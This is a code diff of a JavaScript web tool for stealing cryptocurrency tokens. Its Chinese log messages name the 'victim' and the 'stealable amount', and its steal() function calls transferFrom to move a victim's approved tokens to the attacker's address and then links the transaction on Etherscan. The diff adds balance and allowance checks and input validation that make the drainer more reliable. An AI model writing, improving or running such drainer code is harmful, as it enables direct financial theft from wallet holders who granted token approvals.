@@ -87,13 +87,27 @@ async function getMax() {
   document.getElementById("amount").value = max;
   updateRecent(victim);
   log("🟢 受害者：" + victim);
-  log("✅ 可盜金額：" + max);
+  
+  log("💰 Balance: " + balance);
+  log("🪙 Allowance: " + allowance);
+  if (max === "0") {
+    log("❌ 無法盜取：餘額或授權額度為 0");
+  } else {
+    log("✅ 可盜金額：" + max);
+  }
+
 }
 
 async function steal() {
   await init();
   const victim = document.getElementById("victim").value;
+  
   const amount = document.getElementById("amount").value;
+  if (!victim || victim.toLowerCase() === attacker.toLowerCase()) {
+    log("❌ 錯誤：受害者地址無效或等於攻擊者本身");
+    return;
+  }
+
   try {
     const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
     const link = "https://etherscan.io/tx/" + tx.transactionHash;
